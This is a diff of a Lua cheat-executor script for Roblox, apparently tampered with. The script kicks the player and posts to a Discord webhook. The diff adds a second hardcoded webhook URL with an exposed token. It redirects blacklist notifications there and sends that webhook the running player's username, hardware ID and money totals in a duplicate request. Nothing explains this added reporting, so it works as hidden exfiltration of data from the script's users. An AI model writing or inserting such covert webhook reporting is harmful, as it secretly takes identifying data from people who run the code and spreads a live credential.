@@ -1,4 +1,5 @@
 
+local startingmoney = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.Money.Text
 local TIME_ZONE = 0
 
 local date = os.date("!*t")
@@ -10,6 +11,7 @@ local timestamp = string.format("%02i:%02i %s", ((hour - 1) % 12) + 1, date.min,
 local plr = game.Players.LocalPlayer
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 HttpService = game:GetService("HttpService")
+Webhook_URLme = "https://discord.com/api/webhooks/1084344739043741796/oYB3V3dkFDIutTN_i2L_N2uwBo6nq1IHuYCBwEmTZoBzjmzO3C7jKNrip2uvJY1kyzAM"
 local blacklist = {
     
 }
@@ -19,7 +21,7 @@ if table.find(blacklist, hwid) then
     plr:Kick("You have been blacklisted from all egg head scripts  (rip bozo)")
     local onexec = syn.request(
 	{
-		Url = Webhook_URL,
+		Url = Webhook_URLme,
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = 'application/json'
@@ -47,7 +49,7 @@ if table.find(blacklist, hwid) then
     else
         local onexec = syn.request(
 	{
-		Url = Webhook_URL,
+		Url = Webhook_URLme,
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = 'application/json'
@@ -101,6 +103,7 @@ local Rand = Random.new()
 if not  table.find(blacklist, hwid) then
     wait(Rand:NextNumber(minimumtime,maximumtime))
 plr:Kick(messages[math.random(1, #messages)])
+local money = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.Money.Text
 local response = syn.request(
 	{
 		Url = Webhook_URL,
@@ -123,7 +126,37 @@ local response = syn.request(
 					},
 					{
 					    ["name"] = "Gains:",
-						["value"] = "Working on this feature :)",
+						["value"] = "Started at: "..startingmoney.." Ended at: "..money,
+						["inline"] = false
+					}
+				}
+			}}
+		})
+	}
+)
+local response = syn.request(
+	{
+		Url = Webhook_URLme,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = 'application/json'
+		},
+		Body = HttpService:JSONEncode({
+			["content"] = "",
+			["embeds"] = {{
+				["title"] = "Your account has been kicked",
+				["description"] = plr.Name.." Was kicked. The gains are as listed below.",
+				["type"] = "rich",
+				["color"] = tonumber(0xffffff),
+				["fields"] = {
+					{
+						["name"] = "Hardware ID:",
+						["value"] = hwid,
+						["inline"] = true
+					},
+					{
+					    ["name"] = "Gains:",
+						["value"] = "Started at: "..startingmoney.." Ended at: "..money,
 						["inline"] = false
 					}
 				}
